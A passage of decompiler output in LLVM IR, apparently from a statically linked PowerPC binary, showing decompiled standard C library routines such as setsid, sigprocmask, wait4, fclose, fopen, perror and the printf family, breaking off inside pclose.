dec_label_pc_10019488:                            ; preds = %entry, %dec_label_pc_1001947c
  %v0_10019498 = phi i32 [ %v0_1001946c, %entry ], [ -1, %dec_label_pc_1001947c ]
  ret i32 %v0_10019498

; uselistorder directives
  uselistorder label %dec_label_pc_10019488, { 1, 0 }
}

define i32 @__GI_setrlimit(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100194b4 = call i32 @__asm_mfcr()
  %v1_100194b8 = and i32 %v0_100194b4, 268435456
  %v3_100194b8 = icmp eq i32 %v1_100194b8, 0
  store i32 %v0_100194b4, i32* %r31.global-to-local, align 4
  br i1 %v3_100194b8, label %dec_label_pc_100194d0, label %dec_label_pc_100194c4

dec_label_pc_100194c4:                            ; preds = %entry
  %v0_100194c4 = call i32 @__errno_location()
  %v0_100194c8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100194c8 = inttoptr i32 %v0_100194c4 to i32*
  store i32 %v0_100194c8, i32* %v2_100194c8, align 4
  br label %dec_label_pc_100194d0

dec_label_pc_100194d0:                            ; preds = %entry, %dec_label_pc_100194c4
  %v0_100194e0 = phi i32 [ %v0_100194b4, %entry ], [ -1, %dec_label_pc_100194c4 ]
  ret i32 %v0_100194e0

; uselistorder directives
  uselistorder label %dec_label_pc_100194d0, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100194fc = call i32 @__asm_mfcr()
  %v1_10019500 = and i32 %v0_100194fc, 268435456
  %v3_10019500 = icmp eq i32 %v1_10019500, 0
  store i32 %v0_100194fc, i32* %r31.global-to-local, align 4
  br i1 %v3_10019500, label %dec_label_pc_10019518, label %dec_label_pc_1001950c

dec_label_pc_1001950c:                            ; preds = %entry
  %v0_1001950c = call i32 @__errno_location()
  %v0_10019510 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019510 = inttoptr i32 %v0_1001950c to i32*
  store i32 %v0_10019510, i32* %v2_10019510, align 4
  br label %dec_label_pc_10019518

dec_label_pc_10019518:                            ; preds = %entry, %dec_label_pc_1001950c
  %v0_10019528 = phi i32 [ %v0_100194fc, %entry ], [ -1, %dec_label_pc_1001950c ]
  ret i32 %v0_10019528

; uselistorder directives
  uselistorder label %dec_label_pc_10019518, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v3_1001952c = icmp eq i32 %arg2, 0
  br i1 %v3_1001952c, label %dec_label_pc_1001956c, label %dec_label_pc_10019554

dec_label_pc_10019554:                            ; preds = %entry
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_1001956c, label %dec_label_pc_1001955c

dec_label_pc_1001955c:                            ; preds = %dec_label_pc_10019554
  %v0_1001955c = call i32 @__errno_location()
  %v2_10019564 = inttoptr i32 %v0_1001955c to i32*
  store i32 22, i32* %v2_10019564, align 4
  %v0_10019590.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001958c

dec_label_pc_1001956c:                            ; preds = %dec_label_pc_10019554, %entry
  %v0_10019570 = call i32 @__asm_mfcr()
  %v1_10019574 = and i32 %v0_10019570, 268435456
  %v3_10019574 = icmp eq i32 %v1_10019574, 0
  store i32 %v0_10019570, i32* %r31.global-to-local, align 4
  br i1 %v3_10019574, label %dec_label_pc_1001958c, label %dec_label_pc_10019580

dec_label_pc_10019580:                            ; preds = %dec_label_pc_1001956c
  %v0_10019580 = call i32 @__errno_location()
  %v0_10019584 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019584 = inttoptr i32 %v0_10019580 to i32*
  store i32 %v0_10019584, i32* %v2_10019584, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001958c

dec_label_pc_1001958c:                            ; preds = %dec_label_pc_1001956c, %dec_label_pc_1001955c, %dec_label_pc_10019580
  %v0_10019590 = phi i32 [ %v0_10019570, %dec_label_pc_1001956c ], [ %v0_10019590.pre, %dec_label_pc_1001955c ], [ -1, %dec_label_pc_10019580 ]
  ret i32 %v0_10019590

; uselistorder directives
  uselistorder label %dec_label_pc_1001958c, { 2, 0, 1 }
}

define i32 @__libc_sigsuspend(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100195c0 = call i32 @__asm_mfcr()
  %v1_100195c4 = and i32 %v0_100195c0, 268435456
  %v3_100195c4 = icmp eq i32 %v1_100195c4, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_100195c0, i32* %r31.global-to-local, align 4
  br i1 %v3_100195c4, label %dec_label_pc_100195dc, label %dec_label_pc_100195d0

dec_label_pc_100195d0:                            ; preds = %entry
  %v0_100195d0 = call i32 @__errno_location()
  %v0_100195d4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100195d4 = inttoptr i32 %v0_100195d0 to i32*
  store i32 %v0_100195d4, i32* %v2_100195d4, align 4
  br label %dec_label_pc_100195dc

dec_label_pc_100195dc:                            ; preds = %entry, %dec_label_pc_100195d0
  %v0_100195ec = phi i32 [ %v0_100195c0, %entry ], [ -1, %dec_label_pc_100195d0 ]
  ret i32 %v0_100195ec

; uselistorder directives
  uselistorder label %dec_label_pc_100195dc, { 1, 0 }
}

define i32 @__GI_time(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10019608 = call i32 @__asm_mfcr()
  %v1_1001960c = and i32 %v0_10019608, 268435456
  %v3_1001960c = icmp eq i32 %v1_1001960c, 0
  store i32 %v0_10019608, i32* %r31.global-to-local, align 4
  br i1 %v3_1001960c, label %dec_label_pc_10019624, label %dec_label_pc_10019618

dec_label_pc_10019618:                            ; preds = %entry
  %v0_10019618 = call i32 @__errno_location()
  %v0_1001961c = load i32, i32* %r31.global-to-local, align 4
  %v2_1001961c = inttoptr i32 %v0_10019618 to i32*
  store i32 %v0_1001961c, i32* %v2_1001961c, align 4
  br label %dec_label_pc_10019624

dec_label_pc_10019624:                            ; preds = %entry, %dec_label_pc_10019618
  %v0_10019634 = phi i32 [ %v0_10019608, %entry ], [ -1, %dec_label_pc_10019618 ]
  ret i32 %v0_10019634

; uselistorder directives
  uselistorder label %dec_label_pc_10019624, { 1, 0 }
}

define i32 @__libc_wait(i32 %arg1) local_unnamed_addr {
entry:
  %v4_10019648 = call i32 @wait4(i32 -1, i32 %arg1, i32 0, i32 0)
  ret i32 %v4_10019648
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10019664 = call i32 @__asm_mfcr()
  %v1_10019668 = and i32 %v0_10019664, 268435456
  %v3_10019668 = icmp eq i32 %v1_10019668, 0
  store i32 %v0_10019664, i32* %r31.global-to-local, align 4
  br i1 %v3_10019668, label %dec_label_pc_10019680, label %dec_label_pc_10019674

dec_label_pc_10019674:                            ; preds = %entry
  %v0_10019674 = call i32 @__errno_location()
  %v0_10019678 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019678 = inttoptr i32 %v0_10019674 to i32*
  store i32 %v0_10019678, i32* %v2_10019678, align 4
  br label %dec_label_pc_10019680

dec_label_pc_10019680:                            ; preds = %entry, %dec_label_pc_10019674
  %v0_10019690 = phi i32 [ %v0_10019664, %entry ], [ -1, %dec_label_pc_10019674 ]
  ret i32 %v0_10019690

; uselistorder directives
  uselistorder label %dec_label_pc_10019680, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_10019698 = load i32, i32* @r4, align 4
  %v2_10019698 = load i32, i32* @r5, align 4
  %v4_10019698 = call i32 @wait4(i32 0, i32 %v1_10019698, i32 %v2_10019698, i32 0)
  ret i32 %v4_10019698
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100196b4 = call i32 @__asm_mfcr()
  %v1_100196b8 = and i32 %v0_100196b4, 268435456
  %v3_100196b8 = icmp eq i32 %v1_100196b8, 0
  store i32 %v0_100196b4, i32* %r31.global-to-local, align 4
  br i1 %v3_100196b8, label %dec_label_pc_100196d0, label %dec_label_pc_100196c4

dec_label_pc_100196c4:                            ; preds = %entry
  %v0_100196c4 = call i32 @__errno_location()
  %v0_100196c8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100196c8 = inttoptr i32 %v0_100196c4 to i32*
  store i32 %v0_100196c8, i32* %v2_100196c8, align 4
  br label %dec_label_pc_100196d0

dec_label_pc_100196d0:                            ; preds = %entry, %dec_label_pc_100196c4
  %v0_100196e0 = phi i32 [ %v0_100196b4, %entry ], [ -1, %dec_label_pc_100196c4 ]
  ret i32 %v0_100196e0

; uselistorder directives
  uselistorder label %dec_label_pc_100196d0, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_100196e4 = add i32 %arg1, 128
  %v1_100196e8 = mul i32 %arg1, 2
  %v2_100196ec = icmp ugt i32 %v1_100196e4, 383
  %v0_100196f0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_100196ec, i32 %v0_100196f0)
  %v3_100196f8 = load i32, i32* inttoptr (i32 268718384 to i32*), align 16
  %v2_100196fc = add i32 %v1_100196e8, %v3_100196f8
  %v3_100196fc = inttoptr i32 %v2_100196fc to i16*
  %v4_100196fc = load i16, i16* %v3_100196fc, align 2
  %v5_100196fc = sext i16 %v4_100196fc to i32
  ret i32 %v5_100196fc
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10019718 = add i32 %tmp, 52
  %v3_10019718 = inttoptr i32 %v2_10019718 to i32*
  %v4_10019718 = load i32, i32* %v3_10019718, align 4
  store i32 %v4_10019718, i32* @r28, align 4
  %v3_1001971c = icmp eq i32 %v4_10019718, 0
  store i1 %v3_1001971c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001971c, label %dec_label_pc_10019724, label %dec_label_pc_10019744

dec_label_pc_10019724:                            ; preds = %entry
  %v2_10019724 = add i32 %tmp, 56
  %v4_10019738 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 %v2_10019724)
  store i32 268539716, i32* @lr, align 4
  %v1_10019740 = call i32 @pthread_mutex_lock(i32 %v2_10019724)
  %v0_10019744.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10019744

dec_label_pc_10019744:                            ; preds = %entry, %dec_label_pc_10019724
  %v0_10019754 = phi i32 [ %tmp, %entry ], [ %v0_10019744.pre, %dec_label_pc_10019724 ]
  %v1_10019744 = inttoptr i32 %v0_10019754 to i16*
  %v2_10019744 = load i16, i16* %v1_10019744, align 2
  %v3_10019744 = zext i16 %v2_10019744 to i32
  store i32 0, i32* @r27, align 4
  %v1_1001974c = and i32 %v3_10019744, 64
  %v3_1001974c = icmp eq i32 %v1_1001974c, 0
  br i1 %v3_1001974c, label %dec_label_pc_10019760, label %dec_label_pc_10019754

dec_label_pc_10019754:                            ; preds = %dec_label_pc_10019744
  store i32 268539740, i32* @lr, align 4
  %v4_10019758 = call i32 @fflush_unlocked(i16* %v1_10019744, i32 %v1_1001974c)
  store i32 %v4_10019758, i32* @r27, align 4
  %v0_10019760.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10019760

dec_label_pc_10019760:                            ; preds = %dec_label_pc_10019744, %dec_label_pc_10019754
  %v0_10019760 = phi i32 [ %v0_10019754, %dec_label_pc_10019744 ], [ %v0_10019760.pre, %dec_label_pc_10019754 ]
  %v1_10019760 = add i32 %v0_10019760, 4
  %v2_10019760 = inttoptr i32 %v1_10019760 to i32*
  %v3_10019760 = load i32, i32* %v2_10019760, align 4
  store i32 268539752, i32* @lr, align 4
  %v1_10019764 = call i32 @__libc_close(i32 %v3_10019760)
  %v3_10019768 = icmp eq i32 %v1_10019764, 0
  store i1 %v3_10019768, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_10019764, -1
  br i1 %tmp8, label %dec_label_pc_10019774, label %dec_label_pc_10019770

dec_label_pc_10019770:                            ; preds = %dec_label_pc_10019760
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10019774

dec_label_pc_10019774:                            ; preds = %dec_label_pc_10019760, %dec_label_pc_10019770
  store i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_10044d78.1134 to i32), i32* @r29, align 4
  %v1_10019788 = load i32, i32* @r31, align 4
  %v2_10019788 = add i32 %v1_10019788, 4
  %v3_10019788 = inttoptr i32 %v2_10019788 to i32*
  store i32 -1, i32* %v3_10019788, align 4
  %v2_1001978c = ptrtoint i32* %stack_var_-40 to i32
  %v0_10019790 = load i32, i32* @r26, align 4
  %v0_10019794 = load i32, i32* @r29, align 4
  %v4_1001979c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_10019790, i32 %v0_10019794)
  %v0_100197a0 = load i32, i32* @r29, align 4
  store i32 268539816, i32* @lr, align 4
  %v1_100197a4 = call i32 @pthread_mutex_lock(i32 %v0_100197a0)
  %v3_100197ac = load i32, i32* @global_var_10045238.1135, align 4
  store i32 %v2_1001978c, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_100197b8 = add i32 %v3_100197ac, 1
  store i32 %v1_100197b8, i32* @global_var_10045238.1135, align 4
  store i32 268539844, i32* @lr, align 4
  %v0_100197c0 = call i32 @__pthread_cleanup_pop_restore()
  %v0_100197c4 = load i32, i32* @r31, align 4
  %v1_100197c4 = inttoptr i32 %v0_100197c4 to i16*
  %v2_100197c4 = load i16, i16* %v1_100197c4, align 2
  %v3_100197c4 = zext i16 %v2_100197c4 to i32
  %v0_100197c8 = load i32, i32* @r28, align 4
  %v3_100197c8 = icmp eq i32 %v0_100197c8, 0
  store i1 %v3_100197c8, i1* %cr7_eq.global-to-local, align 1
  %v1_100197cc = call i32 @__asm_rlwinm(i32 %v3_100197c4, i32 0, i32 17, i32 18)
  %v1_100197d4 = or i32 %v1_100197cc, 48
  %v1_100197d8 = trunc i32 %v1_100197d4 to i16
  %v2_100197d8 = load i32, i32* @r31, align 4
  %v3_100197d8 = inttoptr i32 %v2_100197d8 to i16*
  store i16 %v1_100197d8, i16* %v3_100197d8, align 2
  %v0_100197dc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100197dc, label %dec_label_pc_100197e0, label %dec_label_pc_100197ec

dec_label_pc_100197e0:                            ; preds = %dec_label_pc_10019774
  %v2_100197e0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100197e0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268539884, i32* @lr, align 4
  %v0_100197e8 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_100197ec

dec_label_pc_100197ec:                            ; preds = %dec_label_pc_10019774, %dec_label_pc_100197e0
  %v0_100197ec = load i32, i32* @r31, align 4
  %v1_100197ec = inttoptr i32 %v0_100197ec to i16*
  %v2_100197ec = load i16, i16* %v1_100197ec, align 2
  %v1_100197f0 = and i16 %v2_100197ec, 16384
  %v3_100197f0 = icmp eq i16 %v1_100197f0, 0
  br i1 %v3_100197f0, label %dec_label_pc_10019800, label %dec_label_pc_100197f8

dec_label_pc_100197f8:                            ; preds = %dec_label_pc_100197ec
  %v1_100197f8 = add i32 %v0_100197ec, 8
  %v2_100197f8 = inttoptr i32 %v1_100197f8 to i32*
  %v3_100197f8 = load i32, i32* %v2_100197f8, align 4
  store i32 %v3_100197f8, i32* @r3, align 4
  store i32 268539904, i32* @lr, align 4
  %v0_100197fc = call i32 @free()
  br label %dec_label_pc_10019800

dec_label_pc_10019800:                            ; preds = %dec_label_pc_100197ec, %dec_label_pc_100197f8
  %v0_10019800 = load i32, i32* @r29, align 4
  %v0_10019804 = load i32, i32* @r26, align 4
  %v4_1001980c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_10019804, i32 %v0_10019800)
  %v0_10019810 = load i32, i32* @r29, align 4
  store i32 268539928, i32* @lr, align 4
  %v1_10019814 = call i32 @pthread_mutex_lock(i32 %v0_10019810)
  %v3_1001981c = load i16*, i16** @global_var_1004523c.1136, align 4
  %v4_1001981c = ptrtoint i16* %v3_1001981c to i32
  store i32 %v2_1001978c, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_10019828 = add i32 %v4_1001981c, 1
  %v4_1001982c = inttoptr i32 %v1_10019828 to i16*
  store i16* %v4_1001982c, i16** @global_var_1004523c.1136, align 4
  store i32 ptrtoint (i32* @global_var_10019834.1137 to i32), i32* @lr, align 4
  %v0_10019830 = call i32 @__pthread_cleanup_pop_restore()
  store i32 268539960, i32* @lr, align 4
  %v0_10019834 = call i32 @_stdio_openlist_dec_use()
  %v0_1001983c = load i32, i32* @r27, align 4
  ret i32 %v0_1001983c

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10019800, { 1, 0 }
  uselistorder label %dec_label_pc_100197ec, { 1, 0 }
  uselistorder label %dec_label_pc_10019774, { 1, 0 }
  uselistorder label %dec_label_pc_10019760, { 1, 0 }
  uselistorder label %dec_label_pc_10019744, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_10019858 = call i32 @_stdio_fopen(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_10019858
}

define i32 @perror() local_unnamed_addr {
entry:
  %v0_1001985c = load i32, i32* @r3, align 4
  %v3_1001985c = icmp eq i32 %v0_1001985c, 0
  br i1 %v3_1001985c, label %dec_label_pc_10019884, label %dec_label_pc_1001986c

dec_label_pc_1001986c:                            ; preds = %entry
  %v1_1001986c = inttoptr i32 %v0_1001985c to i8*
  %v2_1001986c = load i8, i8* %v1_1001986c, align 1
  %v3_10019870 = icmp eq i8 %v2_1001986c, 0
  br i1 %v3_10019870, label %dec_label_pc_10019884, label %dec_label_pc_10019878

dec_label_pc_10019878:                            ; preds = %dec_label_pc_1001986c
  br label %dec_label_pc_10019888

dec_label_pc_10019884:                            ; preds = %dec_label_pc_1001986c, %entry
  br label %dec_label_pc_10019888

dec_label_pc_10019888:                            ; preds = %dec_label_pc_10019878, %dec_label_pc_10019884
  %v3_10019890 = load i32, i32* inttoptr (i32 268718396 to i32*), align 4
  store i32 %v3_10019890, i32* @r3, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1002e3d4.1140 to i32), i32* @r4, align 4
  %v4_1001989c = call i32 @fprintf(i32 %v3_10019890, i32 ptrtoint ([8 x i8]* @global_var_1002e3d4.1140 to i32), i32 268697600)
  ret i32 %v4_1001989c

; uselistorder directives
  uselistorder label %dec_label_pc_10019888, { 1, 0 }
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 -1, i32* @r4, align 4
  %v0_100198ac = call i32 @__GI_vsnprintf()
  ret i32 %v0_100198ac
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v2_100198bc = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_100198bc, i32* @r5, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_10019914 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10019914, i32* %stack_var_-96, align 4
  store i32 268540192, i32* @lr, align 4
  %v0_1001991c = call i32 @__GI_vfprintf()
  ret i32 %v0_1001991c
}

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r8, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v2_1001993c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1001993c, i32* @r6, align 4
  store i32 3, i32* %stack_var_-104, align 4
  %v2_10019990 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10019990, i32* %stack_var_-96, align 4
  store i32 268540316, i32* @lr, align 4
  %v0_10019998 = call i32 @__GI_vsnprintf()
  ret i32 %v0_10019998
}

define i32 @__GI_asprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r8, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v2_100199b8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_100199b8, i32* @r5, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_10019a10 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10019a10, i32* %stack_var_-96, align 4
  store i32 268540444, i32* @lr, align 4
  %v0_10019a18 = call i32 @__GI_vasprintf()
  ret i32 %v0_10019a18
}

define i32 @sprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_10019a4c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10019a4c, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_10019a9c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10019a9c, i32* %stack_var_-96, align 4
  store i32 268540584, i32* @lr, align 4
  %v0_10019aa4 = call i32 @__GI_vsnprintf()
  ret i32 %v0_10019aa4
}

define i32 @__GI_vasprintf() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10019ac4 = ptrtoint i32* %stack_var_-40 to i32
  %v0_10019ad0 = load i32, i32* @r4, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v2_10019ac4, i32* @r6, align 4
  store i32 %v0_10019ad0, i32* @r5, align 4
  store i32 0, i32* @r3, align 4
  store i32 268540664, i32* @lr, align 4
  %v0_10019af4 = call i32 @__GI_vsnprintf()
  %v0_10019af8 = load i32, i32* @r27, align 4
  %v1_10019af8 = load i32, i32* @r30, align 4
  %v2_10019af8 = inttoptr i32 %v1_10019af8 to i32*
  store i32 %v0_10019af8, i32* %v2_10019af8, align 4
  store i32 %v0_10019af4, i32* @r31, align 4
  %v1_10019afc = icmp slt i32 %v0_10019af4, 0
  br i1 %v1_10019afc, label %dec_label_pc_10019b40, label %dec_label_pc_10019b04

dec_label_pc_10019b04:                            ; preds = %entry
  %v1_10019b04 = add i32 %v0_10019af4, 1
  store i32 %v1_10019b04, i32* @r3, align 4
  store i32 268540688, i32* @lr, align 4
  %v0_10019b0c = call i32 @malloc()
  store i32 %v0_10019b0c, i32* @r3, align 4
  %v0_10019b10 = load i32, i32* @r31, align 4
  store i32 %v0_10019b10, i32* @r4, align 4
  %v3_10019b14 = icmp eq i32 %v0_10019b0c, 0
  %v0_10019b18 = load i32, i32* @r29, align 4
  store i32 %v0_10019b18, i32* @r5, align 4
  %v0_10019b1c = load i32, i32* @r28, align 4
  store i32 %v0_10019b1c, i32* @r6, align 4
  %v1_10019b20 = load i32, i32* @r30, align 4
  %v2_10019b20 = inttoptr i32 %v1_10019b20 to i32*
  store i32 %v0_10019b0c, i32* %v2_10019b20, align 4
  br i1 %v3_10019b14, label %dec_label_pc_10019b40, label %dec_label_pc_10019b28

dec_label_pc_10019b28:                            ; preds = %dec_label_pc_10019b04
  store i32 268540716, i32* @lr, align 4
  %v0_10019b28 = call i32 @__GI_vsnprintf()
  store i32 %v0_10019b28, i32* @r31, align 4
  %tmp4 = icmp sgt i32 %v0_10019b28, -1
  br i1 %tmp4, label %dec_label_pc_10019b40, label %dec_label_pc_10019b34

dec_label_pc_10019b34:                            ; preds = %dec_label_pc_10019b28
  %v0_10019b34 = load i32, i32* @r30, align 4
  %v1_10019b34 = inttoptr i32 %v0_10019b34 to i32*
  %v2_10019b34 = load i32, i32* %v1_10019b34, align 4
  store i32 %v2_10019b34, i32* @r3, align 4
  store i32 268540732, i32* @lr, align 4
  %v0_10019b38 = call i32 @free()
  %v0_10019b3c = load i32, i32* @r27, align 4
  %v1_10019b3c = load i32, i32* @r30, align 4
  %v2_10019b3c = inttoptr i32 %v1_10019b3c to i32*
  store i32 %v0_10019b3c, i32* %v2_10019b3c, align 4
  br label %dec_label_pc_10019b40

dec_label_pc_10019b40:                            ; preds = %dec_label_pc_10019b28, %dec_label_pc_10019b04, %entry, %dec_label_pc_10019b34
  %v0_10019b44 = load i32, i32* @r31, align 4
  ret i32 %v0_10019b44

; uselistorder directives
  uselistorder i32 ()* @__GI_vsnprintf, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_10019b40, { 3, 0, 1, 2 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_10019b64 = load i32, i32* @r4, align 4
  store i32 %v0_10019b64, i32* @r27, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_10019b80 = load i32, i32* @r3, align 4
  %v1_10019b80 = sub i32 -1, %v0_10019b80
  store i32 %v1_10019b80, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_10019b80, i32* %r31.global-to-local, align 4
  %v2_10019b94 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10019b94, i32* @r3, align 4
  %v0_10019b98 = load i32, i32* @r5, align 4
  store i32 %v0_10019b98, i32* %r29.global-to-local, align 4
  %v0_10019b9c = load i32, i32* @r6, align 4
  store i32 %v0_10019b9c, i32* @r28, align 4
  store i32 268540844, i32* @lr, align 4
  %v0_10019ba8 = call i32 @__stdio_init_mutex()
  %v0_10019bac = load i32, i32* %r30.global-to-local, align 4
  %v1_10019bac = load i32, i32* @r27, align 4
  %v3_10019bac = icmp ugt i32 %v0_10019bac, %v1_10019bac
  %v0_10019bb0 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10019bb0, i32* @r4, align 4
  %v0_10019bb4 = load i32, i32* @r28, align 4
  store i32 %v0_10019bb4, i32* @r5, align 4
  %v2_10019bb8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10019bb8, i32* @r3, align 4
  br i1 %v3_10019bac, label %dec_label_pc_10019bc4, label %dec_label_pc_10019bc8

dec_label_pc_10019bc4:                            ; preds = %entry
  store i32 %v1_10019bac, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10019bc8

dec_label_pc_10019bc8:                            ; preds = %entry, %dec_label_pc_10019bc4
  %v1_10019bc8 = phi i32 [ %v0_10019bac, %entry ], [ %v1_10019bac, %dec_label_pc_10019bc4 ]
  %v0_10019bc8 = load i32, i32* %r31.global-to-local, align 4
  store i32 268540904, i32* @lr, align 4
  %v0_10019be4 = call i32 @_vfprintf_internal()
  %v0_10019be8 = load i32, i32* @r30, align 4
  %v3_10019be8 = icmp eq i32 %v0_10019be8, 0
  br i1 %v3_10019be8, label %dec_label_pc_10019c10, label %dec_label_pc_10019bf0

dec_label_pc_10019bf0:                            ; preds = %dec_label_pc_10019bc8
  %v1_10019bf8 = add i32 %v0_10019bc8, -1
  store i32 %v1_10019bf8, i32* @r11, align 4
  %v4_10019bfc = icmp eq i32 %v1_10019bc8, 0
  %v0_10019c04.v0_10019bc8 = select i1 %v4_10019bfc, i32 %v1_10019bf8, i32 %v0_10019bc8
  %stack_var_-88.0 = inttoptr i32 %v0_10019c04.v0_10019bc8 to i8*
  %v0_10019c0c = load i32, i32* @r26, align 4
  %v1_10019c0c = trunc i32 %v0_10019c0c to i8
  store i8 %v1_10019c0c, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_10019c10

dec_label_pc_10019c10:                            ; preds = %dec_label_pc_10019bc8, %dec_label_pc_10019bf0
  ret i32 %v0_10019be4

; uselistorder directives
  uselistorder i32 %v0_10019b80, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder label %dec_label_pc_10019c10, { 1, 0 }
  uselistorder label %dec_label_pc_10019bc8, { 1, 0 }
}

define i32 @pclose(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1004b82c.1141 to i32), i32* %r29.global-to-local, align 4
  %v2_10019c48 = ptrtoint i32* %stack_var_-52 to i32
